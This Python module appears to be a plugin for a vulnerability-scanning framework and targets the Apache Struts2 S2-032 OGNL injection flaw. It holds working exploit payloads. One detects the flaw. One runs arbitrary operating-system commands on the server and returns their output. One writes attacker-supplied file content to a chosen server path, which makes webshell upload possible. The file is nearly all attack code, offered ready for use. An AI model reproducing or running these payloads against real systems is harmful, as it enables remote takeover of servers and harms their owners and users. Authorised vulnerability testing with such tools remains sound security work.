#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'Struts2-032'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-032'
        self.type = 'rce'
        self.level = 'high'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.url != None:
            prove_poc = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=struts2_security_vul&path=_str2016'''
            poc_key = "struts2_security_vul",
            try:
                headers = {'Content-Type': "application/x-www-form-urlencoded"}
                res = self.curl('get', self.url, params=prove_poc, headers=headers)
                if poc_key in res.headers or poc_key in res.text:
                    self.flag = 1
                    self.req.append({"poc": prove_poc})
                    self.res.append({"info": self.url, "key": 'struts2_032'})
            except:
                pass


    def exec(self):
        self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc =  '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=%COMMAND%&pp=\\\\AAAA&ppp=%20&encoding=UTF-8'''
            headers = {}
            try:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                res = self.curl('get', self.url, params=exec_poc.replace("%COMMAND%", cmd)).text
                self.flag = 1
                self.req.append({"poc": exec_poc})
                self.res.append({"info": res, "key": cmd})
            except:
                pass

    def upload(self):
        self.get_url()
        if self.url != None:
            upload_poc = '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f'''
            despath = self.parameter['despath']
            srcpath = self.parameter['srcpath']
            content = self.read_file(srcpath['srcpath'])
            headers =  {}
            try:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                self.curl('get', self.url,params=upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content),headers=headers)
                self.flag = 1
                self.req.append({"poc": upload_poc})
                self.res.append({"info": despath, "key": "upload"})
            except:
                pass
